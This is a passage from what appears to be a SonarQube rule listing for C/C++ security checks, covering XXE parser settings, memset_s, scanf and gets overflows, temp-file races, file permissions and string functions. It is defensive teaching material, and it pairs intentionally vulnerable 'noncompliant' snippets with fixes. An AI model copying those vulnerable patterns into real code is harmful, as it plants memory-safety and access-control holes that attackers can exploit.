  DOMparser-&gt;setCreateEntityReferenceNodes(false); // Noncompliant
  DOMparser-&gt;setDisableDefaultEntityResolution(false); // Noncompliant

  DOMparser-&gt;parse(xmlFile);
}
</pre>
<p>By default, entities resolution is enabled for <code>XMLReaderFactory::createXMLReader</code>.</p>
<pre data-diff-id="12" data-diff-type="noncompliant">
#include "xercesc/sax2/SAX2XMLReader.hpp"

void parse() {
  SAX2XMLReader* reader = XMLReaderFactory::createXMLReader();
  reader-&gt;setFeature(XMLUni::fgXercesDisableDefaultEntityResolution, false); // Noncompliant

  reader-&gt;parse(xmlFile);
}
</pre>
<p>By default, entities resolution is enabled for <code>SAXParser</code>.</p>
<pre data-diff-id="13" data-diff-type="noncompliant">
#include "xercesc/parsers/SAXParser.hpp"

void parse() {
  SAXParser* SAXparser = new SAXParser();
  SAXparser-&gt;setDisableDefaultEntityResolution(false); // Noncompliant

  SAXparser-&gt;parse(xmlFile);
}
</pre>
<h4>Compliant solution</h4>
<p>By default, <code>XercesDOMParser</code> is safe.</p>
<pre data-diff-id="11" data-diff-type="compliant">
#include "xercesc/parsers/XercesDOMParser.hpp"

void parse() {
  XercesDOMParser *DOMparser = new XercesDOMParser();
  DOMparser-&gt;setCreateEntityReferenceNodes(true);
  DOMparser-&gt;setDisableDefaultEntityResolution(true);

  DOMparser-&gt;parse(xmlFile);
}
</pre>
<pre data-diff-id="12" data-diff-type="compliant">
#include "xercesc/sax2/SAX2XMLReader.hpp"

void parse() {
  SAX2XMLReader* reader = XMLReaderFactory::createXMLReader();
  reader-&gt;setFeature(XMLUni::fgXercesDisableDefaultEntityResolution, true);

  reader-&gt;parse(xmlFile);
}
</pre>
<pre data-diff-id="13" data-diff-type="compliant">
#include "xercesc/parsers/SAXParser.hpp"

void parse() {
  SAXParser* SAXparser = new SAXParser();
  SAXparser-&gt;setDisableDefaultEntityResolution(true);

  SAXparser-&gt;parse(xmlFile);
}
</pre>
<h3>How does this work?</h3>
<h4>Disable external entities</h4>
<p>The most effective approach to prevent XXE vulnerabilities is to disable external entity processing entirely, unless it is explicitly required for
specific use cases. By default, XML parsers should be configured to reject the processing of external entities. This can be achieved by setting the
appropriate properties or options in your XML parser library or framework.</p>
<p>If external entity processing is necessary for certain scenarios, adopt a whitelisting approach to restrict the entities that can be resolved
during XML parsing. Create a list of trusted external entities and disallow all others. This approach ensures that only known and safe entities are
processed.<br> You should rely on features provided by your XML parser to restrict the external entities.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)">Top 10 2017 Category A4 - XML External
  Entities (XXE)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/611">CWE-611 - Information Exposure Through XML External Entity Reference</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/827">CWE-827 - Improper Control of Document Type Definition</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5798">
              c:S5798
            </a>
          </td>
          <td>
            <details>
              <p>If a buffer contains sensitive data, such as passwords or access tokens, it is good practice to overwrite the buffer before releasing the memory.
This ensures that the sensitive data is not available when that memory is reallocated. The <code>memset</code> function is commonly used for this
purpose.</p>
<h2>Why is this an issue?</h2>
<p>The C language specification allows the compiler to remove unnecessary code during the optimization phase. For example, when a memory buffer is
about to be destroyed, any writes to that buffer may be seen as unnecessary to the operation of the program. The compiler may choose to remove these
write operations.</p>
<p>When the <code>memset</code> function is used to clear sensitive data from memory and that memory is destroyed immediately afterward, the compiler
may see the <code>memset</code> call as unnecessary and remove it. The sensitive data will, therefore, remain in memory.</p>
<p>This rule raises an issue when a call to <code>memset</code> is followed by the destruction of the buffer.</p>
<h2>How to fix it</h2>
<p>The function <a href="https://en.cppreference.com/w/c/string/byte/memset"><code>memset_s</code></a> behaves similarly to <code>memset</code>. The
main difference is that it cannot be optimized away and the memory will be overwritten in all cases. You should use <code>memset_s</code> to clear
security-sensitive data.</p>
<p>The <code>memset_s</code> function is defined in annex K of C11 and is optional for C11 compilers. It will only be available if the macro
<code>__STDC_LIB_EXT1__</code> is defined, and it must be enabled by defining the macro <code>__STDC_WANT_LIB_EXT1__</code> before including
<code>&lt;string.h&gt;</code>.</p>
<p>Other platform-specific functions can perform the same operation, such as <a
href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa366877(v=vs.85)?redirectedfrom=MSDN">SecureZeroMemory</a> (Windows)
or <a href="https://www.freebsd.org/cgi/man.cgi?query=explicit_bzero">explicit_bzero</a> (FreeBSD).</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
#include &lt;string&gt;

void f(char *password, size_t bufferSize) {
  char localToken[256];
  init(localToken, password);
  memset(password, 0, strlen(password));  // Noncompliant
  memset(localToken, 0, strlen(localToken));  // Noncompliant
  free(password);
}
</pre>
<p>The <code>memset</code> calls may be optimized away because <code>password</code> is about to be freed and <code>localToken</code> is about to go
out of scope.</p>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
#define __STDC_WANT_LIB_EXT1__
#include &lt;string&gt;

void f(char *password, size_t bufferSize) {
  char localToken[256];
  init(localToken, password);
  memset_s(password, bufferSize, 0, strlen(password));
  memset_s(localToken, sizeof(localToken), 0, strlen(localToken));
  free(password);
}
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> C++ reference - <a href="https://en.cppreference.com/w/c/string/byte/memset"><code>memset</code>, <code>memset_s</code></a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://github.com/OWASP/ASVS/blob/master/4.0/en/0x16-V8-Data-Protection.md#v83-sensitive-private-data">Application Security
  Verification Standard 4.0 - 8.3.6</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/14">CWE-14 - Compiler Removal of Code to Clear Buffers</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S1079">
              c:S1079
            </a>
          </td>
          <td>
            <details>
              <p>The <code>%s</code> format specifier is used to read a string into a buffer. If the input string exceeds the size of this buffer, a buffer overflow
can occur.</p>
<h2>Why is this an issue?</h2>
<p>By default, there is no limit on the length of the string being read. The <code>scanf</code> family of functions will continue to read characters
into the buffer until they encounter a whitespace character.</p>
<p>If the input contains a string that is long enough and lacks whitespace characters, it can result in memory beyond the end of the buffer being
overwritten. This situation is known as a buffer overflow vulnerability.</p>
<h3>What is the potential impact?</h3>
<p>An attacker could exploit this vulnerability to overwrite memory used by the application. This could result in the modification of application
data, unexpected behavior, or even cause the application to become unstable or crash. In some cases, the attacker might also gain control over the
execution flow of the application, leading to arbitrary code execution.</p>
<h2>How to fix it</h2>
<p>A field width can be used together with the <code>%s</code> format specifier. This places an upper limit on the number of characters that will be
read into the buffer.</p>
<p>Note that the <code>%s</code> format specifier always null-terminates the string in the buffer. You will need to ensure that the buffer is large
enough to hold the required input and the null terminator.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
char buffer[10];
scanf("%s", buffer);  // Noncompliant
</pre>
<p>If this code is given the word <code>noncompliant</code> as an input, <code>noncomplia</code> will be stored in <code>buffer</code> and
<code>nt␀</code> will overwrite the contents of the memory immediately following <code>buffer</code>.</p>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
char buffer[10];
scanf("%9s", buffer);
</pre>
<p>If this code is given the word <code>noncompliant</code> as an input, <code>noncompli␀</code> will be stored in <code>buffer</code>.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> Wikipedia - <a href="https://en.wikipedia.org/wiki/Buffer_overflow">Buffer overflow</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">Top 10 2017 Category A9 -
  Using Components with Known Vulnerabilities</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/120">CWE-120 - Buffer Copy without Checking Size of Input</a> ('Classic Buffer Overflow')
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/676">CWE-676 - Use of Potentially Dangerous Function</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5443">
              c:S5443
            </a>
          </td>
          <td>
            <details>
              <p>Operating systems have global directories where any user has write access. Those folders are mostly used as temporary storage areas like
<code>/tmp</code> in Linux based systems. An application manipulating files from these folders is exposed to race conditions on filenames: a malicious
user can try to create a file with a predictable name before the application does. A successful attack can result in other files being accessed,
modified, corrupted or deleted. This risk is even higher if the application runs with elevated permissions.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2012-2451">CVE-2012-2451</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-1838">CVE-2015-1838</a> </li>
</ul>
<p>This rule raises an issue whenever it detects a hard-coded path to a publicly writable directory like <code>/tmp</code> (see examples bellow). It
also detects access to environment variables that point to publicly writable directories, e.g., <code>TMP</code> and <code>TMPDIR</code>.</p>
<ul>
  <li> <code>/tmp</code> </li>
  <li> <code>/var/tmp</code> </li>
  <li> <code>/usr/tmp</code> </li>
  <li> <code>/dev/shm</code> </li>
  <li> <code>/dev/mqueue</code> </li>
  <li> <code>/run/lock</code> </li>
  <li> <code>/var/run/lock</code> </li>
  <li> <code>/Library/Caches</code> </li>
  <li> <code>/Users/Shared</code> </li>
  <li> <code>/private/tmp</code> </li>
  <li> <code>/private/var/tmp</code> </li>
  <li> <code>\Windows\Temp</code> </li>
  <li> <code>\Temp</code> </li>
  <li> <code>\TMP</code> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Files are read from or written into a publicly writable folder </li>
  <li> The application creates files with predictable names into a publicly writable folder </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use a dedicated sub-folder with tightly controlled permissions </li>
  <li> Use secure-by-design APIs to create temporary files. Such API will make sure:
    <ul>
      <li> The generated filename is unpredictable </li>
      <li> The file is readable and writable only by the creating user ID </li>
      <li> The file descriptor is not inherited by child processes </li>
      <li> The file will be destroyed as soon as it is closed </li>
    </ul>  </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
#include &lt;cstdio&gt;
// ...

void f() {
  FILE * fp = fopen("/tmp/temporary_file", "r"); // Sensitive
}
</pre>
<pre>
#include &lt;cstdio&gt;
#include &lt;cstdlib&gt;
#include &lt;sstream&gt;
// ...

void f() {
  std::stringstream ss;
  ss &lt;&lt; getenv("TMPDIR") &lt;&lt; "/temporary_file"; // Sensitive
  FILE * fp = fopen(ss.str().c_str(), "w");
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#include &lt;cstdio&gt;
#include &lt;cstdlib&gt;
// ...

void f() {
  FILE * fp = tmpfile(); // Compliant
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/377">CWE-377 - Insecure Temporary File</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/379">CWE-379 - Creation of Temporary File in Directory with Incorrect Permissions</a>
  </li>
  <li> <a href="https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File">OWASP, Insecure Temporary File</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S2612">
              c:S2612
            </a>
          </td>
          <td>
            <details>
              <p>In Unix file system permissions, the "<code>others</code>" category refers to all users except the owner of the file system resource and the
members of the group assigned to this resource.</p>
<p>Granting permissions to this category can lead to unintended access to files or directories that could allow attackers to obtain sensitive
information, disrupt services or elevate privileges.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The application is designed to be run on a multi-user environment. </li>
  <li> Corresponding files and directories may contain confidential information. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The most restrictive possible permissions should be assigned to files and directories.</p>
<h2>Sensitive Code Example</h2>
<p>When creating a file or directory with permissions to "other group":</p>
<pre>
open("myfile.txt", O_CREAT, S_IRWXU | S_IRWXG | S_IRWXO); // Sensitive: the process set 777 permissions to this newly created file

mkdir("myfolder", S_IRWXU | S_IRWXG | S_IRWXO); // Sensitive: the process try to set 777 permissions to this newly created directory
</pre>
<p>When explicitly adding permissions to "other group" with <code>chmod</code>, <code>fchmod</code> or <code>filesystem::permissions</code>
functions:</p>
<pre>
chmod("myfile.txt", S_IRWXU | S_IRWXG | S_IRWXO);  // Sensitive: the process set 777 permissions to this file

fchmod(fd, S_IRWXU | S_IRWXG | S_IRWXO); // Sensitive: the process set 777 permissions to this file descriptor
</pre>
<p>When defining the <code>umask</code> without read, write and execute permissions for "other group":</p>
<pre>
umask(S_IRWXU | S_IRWXG); // Sensitive: the further files and folders will be created with possible permissions to "other group"
</pre>
<h2>Compliant Solution</h2>
<p>When creating a file or directory, do not set permissions to "other group":</p>
<pre>
open("myfile.txt", O_CREAT, S_IRWXU | S_IRWXG); // Compliant

mkdir("myfolder", S_IRWXU | S_IRWXG); // Compliant
</pre>
<p>When using <code>chmod</code>, <code>fchmod</code> or <code>filesystem::permissions</code> functions, do not add permissions to "other group":</p>
<pre>
chmod("myfile.txt", S_IRWXU | S_IRWXG);  // Compliant

fchmod(fd, S_IRWXU | S_IRWXG); // Compliant
</pre>
<p>When defining the <code>umask</code>, set read, write and execute permissions to other group:</p>
<pre>
umask(S_IRWXO); // Compliant: further created files or directories will not have permissions set for "other group"
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> <a
  href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission">OWASP File Permission</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/732">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/266">CWE-266 - Incorrect Privilege Assignment</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/c/FIO06-C.+Create+files+with+appropriate+access+permissions">CERT, FIO06-C.</a> - Create
  files with appropriate access permissions </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S1081">
              c:S1081
            </a>
          </td>
          <td>
            <details>
              <p>Insecure functions often involve handling data, such as strings and memory operations. The vulnerability arises when these functions do not
properly check or limit the size of the data they are handling.</p>
<h2>Why is this an issue?</h2>
<p>An attacker typically provides input that exceeds the expected size. This could be through a text field in a user interface, a file that the
program reads, or data sent over a network. The insecure function processes this input and places the result into a provided buffer.</p>
<p>If the input is larger than the buffer can handle, the insecure function will overwrite the memory following the buffer. This situation is known as
a buffer overflow vulnerability.</p>
<p>When using typical C or C++ functions, it’s up to the developer to make sure the size of the buffer to be written to is large enough to avoid
buffer overflows.</p>
<h3>What is the potential impact?</h3>
<h4>Code execution</h4>
<p>In some cases, an attacker can craft input in a way that allows them to gain unauthorized access to your system. For example, they might be able to
overwrite a function’s return address in memory, causing your program to execute code of the attacker’s choosing. This could potentially give the
attacker full control over your system.</p>
<h4>Denial of service</h4>
<p>If an attacker can trigger a buffer overflow by providing oversized input, it can cause the program to crash. If the attacker repeats this process,
it can continually disrupt the service, denying access to other users. This can be particularly damaging for services that require high availability,
such as online platforms or databases.</p>
<p>In some cases, the input might cause the program to enter an infinite loop or consume excessive memory, slowing down the system or even causing it
to become unresponsive. This type of attack is known as a resource exhaustion DoS attack.</p>
<h2>How to fix it</h2>
<p>Insecure functions should be replaced with safer alternatives that limit how much data can be written to the buffer.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
#include &lt;stdio.h&gt;

char str[20];
gets(str); // Noncompliant; `str` buffer size is not checked and it is vulnerable to overflows
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
#include &lt;string.h&gt;

char buffer[20];
strcpy(buffer, input); // Noncompliant; `input` length is not checked and it may overflow `buffer`
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
#define __STDC_WANT_LIB_EXT1__
#include &lt;stdio.h&gt;

char str[20];
gets_s(str, sizeof(str));
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
#define __STDC_WANT_LIB_EXT1__
#include &lt;string.h&gt;

char buffer[20];
strcpy_s(buffer, sizeof buffer, input);
</pre>
<h3>How does this work?</h3>
<p>C and C++ have a number of functions that are considered insecure because they do not perform bounds checking. Functions like <code>gets</code> are
known to be risky. Replace these with safer alternatives that include bounds checking. For example, instead of <code>gets</code>, use
<code>gets_s</code>.</p>
<p>The code can also checks if the size of input data is less than or equal to the size of a buffer (including the terminating null byte when dealing
with strings).</p>
<p>The <code>gets_s</code> function is defined in annex K of C11 and is optional for C11 compilers. It will only be available if the macro
<code>__STDC_LIB_EXT1__</code> is defined, and it must be enabled by defining the macro <code>__STDC_WANT_LIB_EXT1__</code> before including
<code>&lt;stdio.h&gt;</code>.</p>
<p>Other platform-specific functions can perform the same operations. For example, <code>strcpy</code> can be substituted with <a
href="https://learn.microsoft.com/en-us/windows/win32/api/strsafe/nf-strsafe-stringcbcopya">StringCbCopyA</a> (Windows) or <a
href="https://www.freebsd.org/cgi/man.cgi?query=strlcpy">strlcpy</a> (FreeBSD).</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> Wikipedia - <a href="https://en.wikipedia.org/wiki/Buffer_overflow">Buffer overflow</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">Top 10 2021 - A06 - Vulnerable and Outdated
  Components</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">Top 10 2017 Category A9 -
  Using Components with Known Vulnerabilities</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/676">CWE-676 - Use of Potentially Dangerous Function</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/119">CWE-119 - Improper Restriction of Operations within the Bounds of a Memory
  Buffer</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5814">
              c:S5814
            </a>
          </td>
          <td>
            <details>
              <p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means
that the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>
character. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving
access to sensitive data or allowing arbitrary code execution.</p>
<p>The function <code>char *strcat( char *restrict dest, const char *restrict src );</code> appends the characters of string <code>src</code> at the
end of <code>dest</code>. The <code>wcscat</code> does the same for wide characters and should be used with the same guidelines.</p>
<p>Note: the functions <code>strncat</code> and <code>wcsncat</code> might look like attractive safe replacements for <code>strcat</code> and
<code>wcscaty</code>, but they have their own set of issues (see <a href='/organizations/sopra-steria/rules?open=c%3AS5815&rule_key=c%3AS5815'>S5815</a>), and you should probably prefer another more adapted
alternative.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> There is a possibility that either the <code>src</code> or the <code>dest</code> pointer is <code>null</code> </li>
  <li> The current string length of <code>dest</code> plus the current string length of <code>src</code> plus 1 (for the final&nbsp;<code>null</code>
  character) is larger than the size of the buffer pointer-to by <code>src</code> </li>
  <li> There is a possibility that either string is not correctly <code>null</code>-terminated </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> C11 provides, in its annex K, the <code>strcat_s</code> and the <code>wcscat_s</code> that were designed as safer alternatives to
  <code>strcat</code> and <code>wcscat</code>. It’s not recommended to use them in all circumstances, because they introduce a runtime overhead and
  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.
  </li>
  <li> Even if your compiler does not exactly support annex K, you probably have access to similar functions </li>
  <li> If you are writing C++ code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
int f(char *src) {
  char dest[256];
  strcpy(dest, "Result: ");
  strcat(dest, src); // Sensitive: might overflow
  return doSomethingWith(dest);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int f(char *src) {
  char result[] = "Result: ";
  char *dest = malloc(sizeof(result) + strlen(src)); // Not need of +1 for final 0 because sizeof will already count one 0
  strcpy(dest, result);
  strcat(dest, src); // Compliant: the buffer size was carefully crafted
  int r = doSomethingWith(dest);
  free(dest);
  return r;
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">Top 10 2021 Category A6 - Vulnerable and Outdated
  Components</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">Top 10 2017 Category A9 -
  Using Components with Known Vulnerabilities</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/120">CWE-120 - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')</a>
  </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/HdcxBQ">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5813">
              c:S5813
            </a>
          </td>
          <td>
            <details>
              <p>The function <code>size_t strlen(const char *s)</code> measures the length of the string <code>s</code> (excluding the final null character).<br>
The function <code>size_t wcslen(const wchar_t *s)</code> does the same for wide characters, and should be used with the same guidelines.</p>
<p>Similarly to many other functions in the standard C libraries, <code>strlen</code> and <code>wcslen</code> assume that their argument is not a null
pointer.</p>
<p>Additionally, they expect the strings to be null-terminated. For example, the 5-letter string "abcde" must be stored in memory as "abcde\0" (i.e.
using 6 characters) to be processed correctly. When a string is missing the null character at the end, these functions will iterate past the end of
the buffer, which is undefined behavior.</p>
<p>Therefore, string parameters must end with a proper null character. The absence of this particular character can lead to security vulnerabilities
that allow, for example, access to sensitive data or the execution of arbitrary code.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> There is a possibility that the pointer is null. </li>
  <li> There is a possibility that the string is not correctly null-terminated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use safer functions. The C11 functions <code>strlen_s</code> and <code>wcslen_s</code> from annex K handle typical programming errors.<br>
  Note, however, that they have a runtime overhead and require more code for error handling and therefore are not suited to every case. </li>
  <li> Even if your compiler does not exactly support annex K, you probably have access to similar functions. </li>
  <li> If you are writing C++ code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
size_t f(char *src) {
  char dest[256];
  strncpy(dest, src, sizeof dest); // Truncation may happen
  return strlen(dest); // Sensitive: "dest" will not be null-terminated if truncation happened
}
</pre>
<h2>Compliant Solution</h2>
<pre>
size_t f(char *src) {
  char dest[256];
  strncpy(dest, src, sizeof dest); // Truncation may happen
  dest[sizeof dest - 1] = 0;
  return strlen(dest); // Compliant: "dest" is guaranteed to be null-terminated
}
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/120">CWE-120 - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')</a>
  </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/HdcxBQ">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5816">
              c:S5816
            </a>
          </td>
          <td>
            <details>
              <p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means
that the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>
character. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving
access to sensitive data or allowing arbitrary code execution.</p>
<p>The function <code>char *strncpy(char * restrict dest, const char * restrict src, size_t count);</code> copies the first <code>count</code>
characters from <code>src</code> to <code>dest</code>, stopping at the first <code>null</code> character, and filling extra space with 0. The
<code>wcsncpy</code> does the same for wide characters and should be used with the same guidelines.</p>
<p>Both of those functions are designed to work with fixed-length strings and might result in a non-<code>null</code>-terminated string.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> There is a possibility that either the <code>source</code> or the <code>destination</code> pointer is <code>null</code> </li>
  <li> The security of your system can be compromised if the <code>destination</code> is a truncated version of the <code>source</code> </li>
  <li> The <code>source</code> buffer can be both non-<code>null</code>-terminated and smaller than the <code>count</code> </li>
  <li> The <code>destination</code> buffer can be smaller than the <code>count</code> </li>
  <li> You expect <code>dest</code> to be a <code>null</code>-terminated string </li>
  <li> There is an overlap between the <code>source</code> and the <code>destination</code> </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> C11 provides, in its annex K, the <code>strncpy_s</code> and the <code>wcsncpy_s</code> that were designed as safer alternatives to
  <code>strcpy</code> and <code>wcscpy</code>. It’s not recommended to use them in all circumstances, because they introduce a runtime overhead and
  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.
  </li>
  <li> Even if your compiler does not exactly support annex K, you probably have access to similar functions </li>
  <li> If you are using <code>strncpy</code> and <code>wsncpy</code> as a safer version of <code>strcpy</code> and <code>wcscpy</code>, you should
  instead consider <code>strcpy_s</code> and <code>wcscpy_s</code>, because these functions have several shortcomings:
    <ul>
      <li> It’s not easy to detect truncation </li>
      <li> Too much work is done to fill the buffer with 0, leading to suboptimal performance </li>
      <li> Unless manually corrected, the <code>dest</code> string might not be <code>null</code>-terminated </li>
    </ul>  </li>
  <li> If you want to use <code>strcpy</code> and <code>wcscpy</code> functions and detect if the string was truncated, the pattern is the following:
    <ul>
      <li> Set the last character of the buffer to <code>null</code> </li>
      <li> Call the function </li>
      <li> Check if the last character of the buffer is still <code>null</code> </li>
    </ul>  </li>
  <li> If you are writing C++ code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
int f(char *src) {
  char dest[256];
  strncpy(dest, src, sizeof(dest)); // Sensitive: might silently truncate
  return doSomethingWith(dest);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int f(char *src) {
  char dest[256];
  dest[sizeof dest - 1] = 0;
  strncpy(dest, src, sizeof(dest)); // Compliant
  if (dest[sizeof dest - 1] != 0) {
    // Handle error
  }
  return doSomethingWith(dest);
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">Top 10 2021 Category A6 - Vulnerable and Outdated
  Components</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">Top 10 2017 Category A9 -
  Using Components with Known Vulnerabilities</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/120">CWE-120 - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')</a>
  </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/HdcxBQ">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5815">
              c:S5815
            </a>
          </td>
          <td>
            <details>
              <p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means
that the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>
character. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving
access to sensitive data or allowing arbitrary code execution.</p>
